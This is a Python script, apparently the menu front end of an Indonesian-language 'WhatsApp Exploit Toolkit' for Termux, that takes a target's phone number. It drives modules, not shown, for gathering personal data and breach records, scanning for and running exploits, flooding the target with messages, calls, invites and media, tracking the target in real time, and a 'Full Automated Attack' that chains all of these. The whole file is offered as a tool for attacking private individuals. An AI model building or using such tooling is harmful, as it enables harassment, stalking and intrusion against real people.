#!/usr/bin/env python3
import os
import sys
import json
import time
from modules.info_gather import WhatsAppInfoGather
from modules.exploit import WhatsAppExploiter
from modules.bombing import WhatsAppBomber
from modules.tracker import WhatsAppTracker

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    banner = """
    ╔══════════════════════════════════════════╗
    ║      WhatsApp Exploit Toolkit v2.0       ║
    ║          Termux Edition                  ║
    ║      [Made by ArgaaaAi Systems]          ║
    ╚══════════════════════════════════════════╝
    """
    print(banner)

def main_menu():
    clear_screen()
    print_banner()
    
    print("\n[+] Pilih Modul:")
    print("═" * 40)
    print("1. Information Gathering")
    print("2. Exploit Scanner")
    print("3. WhatsApp Bombing")
    print("4. Real-Time Tracker")
    print("5. Full Automated Attack")
    print("6. Settings")
    print("7. Exit")
    print("═" * 40)
    
    choice = input("\n[?] Pilihan: ")
    return choice

def info_gathering_menu():
    clear_screen()
    print("[+] WhatsApp Information Gathering\n")
    
    number = input("[?] Masukkan nomor (628xxx): ")
    if not number:
        return
    
    gather = WhatsAppInfoGather()
    
    print("\n[+] Memulai pengumpulan data...")
    print("═" * 40)
    
    # 1. Basic info
    print("\n[1] Informasi Dasar:")
    basic_info = gather.get_basic_info(number)
    for key, value in basic_info.items():
        print(f"   {key}: {value}")
    
    # 2. WhatsApp status
    print("\n[2] WhatsApp Status:")
    status_info = gather.check_whatsapp_status(number)
    for key, value in status_info.items():
        print(f"   {key}: {value}")
    
    # 3. Social media lookup
    print("\n[3] Cari di Media Sosial:")
    social_info = gather.social_media_lookup(number)
    if social_info:
        for platform, data in social_info.items():
            print(f"   {platform}: {data}")
    
    # 4. Data breach check
    print("\n[4] Cek Data Breach:")
    breach_info = gather.check_data_breaches(number)
    if breach_info:
        for site, info in breach_info.items():
            print(f"   {site}: {info}")
    
    # 5. Generate report
    print("\n[5] Simpan Laporan...")
    filename = gather.save_report(number, {
        'basic': basic_info,
        'status': status_info,
        'social': social_info,
        'breach': breach_info
    })
    print(f"   [+] Laporan disimpan: {filename}")
    
    input("\n[!] Tekan Enter untuk kembali...")

def exploit_scanner_menu():
    clear_screen()
    print("[+] WhatsApp Exploit Scanner\n")
    
    number = input("[?] Masukkan nomor target: ")
    if not number:
        return
    
    exploiter = WhatsAppExploiter()
    
    print("\n[+] Memulai scan kerentanan...")
    print("═" * 40)
    
    vulnerabilities = exploiter.scan_vulnerabilities(number)
    
    if not vulnerabilities:
        print("\n[-] Tidak ditemukan kerentanan yang diketahui")
    else:
        print(f"\n[+] Ditemukan {len(vulnerabilities)} kerentanan:")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\n[{i}] {vuln['name']}")
            print(f"   Deskripsi: {vuln['description']}")
            print(f"   Risiko: {vuln['risk']}")
            print(f"   Eksploit: {vuln['exploit']}")
            
            if input(f"\n   [!] Jalankan eksploit? (y/n): ").lower() == 'y':
                result = exploiter.execute_exploit(number, vuln['type'])
                print(f"   Hasil: {result}")
    
    input("\n[!] Tekan Enter untuk kembali...")

def bombing_menu():
    clear_screen()
    print("[+] WhatsApp Bombing Suite\n")
    
    number = input("[?] Masukkan nomor target: ")
    if not number:
        return
    
    print("\n[+] Pilih metode bombing:")
    print("1. Message Bomb (Standar)")
    print("2. Call Bomb (Experimental)")
    print("3. Group Invite Spam")
    print("4. Media Bomb")
    print("5. Custom Bomb")
    
    choice = input("\n[?] Pilihan: ")
    
    bomber = WhatsAppBomber()
    
    if choice == '1':
        count = int(input("[?] Jumlah pesan: "))
        delay = float(input("[?] Delay antar pesan (detik): "))
        message = input("[?] Pesan (kosong untuk random): ")
        
        print("\n[+] Memulai message bomb...")
        bomber.message_bomb(number, count, delay, message)
        
    elif choice == '2':
        count = int(input("[?] Jumlah panggilan: "))
        print("\n[+] Memulai call bomb...")
        bomber.call_bomb(number, count)
        
    elif choice == '3':
        count = int(input("[?] Jumlah invite: "))
        print("\n[+] Memulai group invite spam...")
        bomber.group_invite_spam(number, count)
        
    elif choice == '4':
        count = int(input("[?] Jumlah media: "))
        media_type = input("[?] Tipe media (image/video/audio): ")
        print("\n[+] Memulai media bomb...")
        bomber.media_bomb(number, count, media_type)
    
    input("\n[!] Tekan Enter untuk kembali...")

def tracker_menu():
    clear_screen()
    print("[+] WhatsApp Real-Time Tracker\n")
    
    number = input("[?] Masukkan nomor target: ")
    if not number:
        return
    
    tracker = WhatsAppTracker()
    duration = int(input("[?] Durasi tracking (menit): "))
    
    print("\n[+] Memulai real-time tracking...")
    print("[+] Tekan Ctrl+C untuk menghentikan")
    print("═" * 40)
    
    try:
        tracker.real_time_tracking(number, duration)
    except KeyboardInterrupt:
        print("\n[-] Tracking dihentikan")
    
    # Generate tracking report
    report = tracker.generate_report(number)
    print("\n[+] Laporan Tracking:")
    for key, value in report.items():
        print(f"   {key}: {value}")
    
    input("\n[!] Tekan Enter untuk kembali...")

def full_attack_menu():
    clear_screen()
    print("[+] Full Automated Attack\n")
    
    number = input("[?] Masukkan nomor target: ")
    if not number:
        return
    
    print("\n[+] Memulai serangan otomatis...")
    print("[+] Ini akan memakan waktu beberapa menit")
    print("═" * 40)
    
    # Phase 1: Recon
    print("\n[FASE 1] Information Gathering...")
    gather = WhatsAppInfoGather()
    info = gather.get_basic_info(number)
    time.sleep(2)
    
    # Phase 2: Vulnerability scan
    print("\n[FASE 2] Vulnerability Scanning...")
    exploiter = WhatsAppExploiter()
    vulns = exploiter.scan_vulnerabilities(number)
    time.sleep(2)
    
    # Phase 3: Exploitation
    print("\n[FASE 3] Exploitation...")
    if vulns:
        for vuln in vulns[:3]:  # Max 3 exploits
            print(f"   [+] Menjalankan: {vuln['name']}")
            result = exploiter.execute_exploit(number, vuln['type'])
            print(f"      Hasil: {result}")
            time.sleep(1)
    
    # Phase 4: Bombing
    print("\n[FASE 4] Bombing Attack...")
    bomber = WhatsAppBomber()
    if input("   [!] Jalankan message bomb? (y/n): ").lower() == 'y':
        bomber.message_bomb(number, 50, 0.1)
    
    # Phase 5: Tracking
    print("\n[FASE 5] Real-Time Tracking...")
    if input("   [!] Aktifkan tracking? (y/n): ").lower() == 'y':
        tracker = WhatsAppTracker()
        tracker_thread = threading.Thread(
            target=tracker.real_time_tracking,
            args=(number, 5)
        )
        tracker_thread.daemon = True
        tracker_thread.start()
        time.sleep(10)
    
    print("\n[+] Serangan selesai!")
    input("\n[!] Tekan Enter untuk kembali...")

if __name__ == "__main__":
    import threading
    
    try:
        while True:
            choice = main_menu()
            
            if choice == '1':
                info_gathering_menu()
            elif choice == '2':
                exploit_scanner_menu()
            elif choice == '3':
                bombing_menu()
            elif choice == '4':
                tracker_menu()
            elif choice == '5':
                full_attack_menu()
            elif choice == '6':
                print("\n[+] Settings menu akan datang...")
                time.sleep(2)
            elif choice == '7':
                print("\n[+] Keluar...")
                break
            else:
                print("\n[-] Pilihan tidak valid")
                time.sleep(1)
                
    except KeyboardInterrupt:
        print("\n\n[-] Program dihentikan")
    except Exception as e:
        print(f"\n[-] Error: {e}")
